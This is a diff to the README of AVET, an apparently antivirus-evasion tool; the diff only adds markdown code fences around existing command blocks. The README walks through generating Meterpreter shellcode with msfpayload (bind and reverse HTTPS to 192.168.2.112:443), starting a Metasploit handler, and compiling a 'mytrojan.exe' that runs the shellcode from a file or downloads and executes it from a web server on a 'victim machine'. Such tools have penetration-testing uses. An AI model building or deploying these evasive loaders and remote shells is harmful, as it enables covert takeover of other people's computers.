@@ -22,72 +22,86 @@ You can use the precompiled avet.exe file as a shellcode loader.
 Example 1, loading shellcode from a file:
 
 Attackers machine:
+```
 $ msfpayload windows/meterpreter/bind_tcp C > sc.txt
 $ ./format.sh sc.txt > sc_clean.txt
+```
 
 Copy sc_clean.txt & avet.exe to the victim machine.
-
+```
 $ msfconsole
 msf > use multi/handler
 msf  exploit(handler) > set payload windows/meterpreter/bind_tcp 
 msf  exploit(handler) > set rhost xyz
 msf  exploit(handler) > exploit 
+```
 
 On the victim machine:
+```
 c:\whatever>avet.exe -f shellcode.txt
-
+```
 
 Example 2, loading shellcode from a webserver:
 
 Attackers machine:
+```
 $ msfpayload windows/meterpreter/bind_tcp C > sc.txt
 $ ./format.sh sc.txt > sc_clean.txt
+```
 
 Copy sc_clean.txt to your webroot and avet.exe to the victim machine.
-
+```
 $ msfconsole
 msf > use multi/handler
 msf  exploit(handler) > set payload windows/meterpreter/bind_tcp 
 msf  exploit(handler) > set rhost xyz
 msf  exploit(handler) > exploit 
+```
 
 On the victim machine:
+```
 c:\whatever>avet.exe -u yourserver/sc_clean.txt
-
+```
 
 How to use make_avet
 --------------------
 Compile if needed:
+```
 $ gcc -o make_avet make_avet.c
+```
 
 Example 1, compile shellcode into the .exe file:
-
+```
 $ msfpayload windows/meterpreter/reverse_https lhost=192.168.2.112 lport=443 C > sh.txt
 $ ./format.sh sh.txt > sh_clean.txt
 $ ./make_avet -f sh_clean.txt
 $ wine ~/.wine/drive_c/MinGW/bin/gcc.exe -o mytrojan.exe avet.c
-
+```
 
 Example 2, make an .exe file that downloads a shellcode from a webserver:
-
+```
 $ msfpayload windows/meterpreter/reverse_https lhost=192.168.2.112 lport=443 C > sh.txt
 $ ./format.sh sh.txt > sh_clean.txt
 $ cp sh_clean.txt /var/www
 $ ./make_avet -u 192.168.2.112/sh_clean.txt
 $ wine ~/.wine/drive_c/MinGW/bin/gcc.exe -o mytrojan.exe avet.c
+```
 
 Check out the other options as well:
+```
 -f compile shellcode into avet.exe, needs filename
 -u load and exec shellcode from url using internet explorer
 -p print debug information
 -h help
-
+```
 
 Some notes
 ----------
 
 Rebuild avet.exe:
 No problem, ensure no content is in defs.h (echo "">defs.h), then compile with:
+```
 $ wine ~/.wine/drive_c/MinGW/bin/gcc.exe -o avet.exe avet.c
+```
 
 Have a look for build.sh for easier handling.
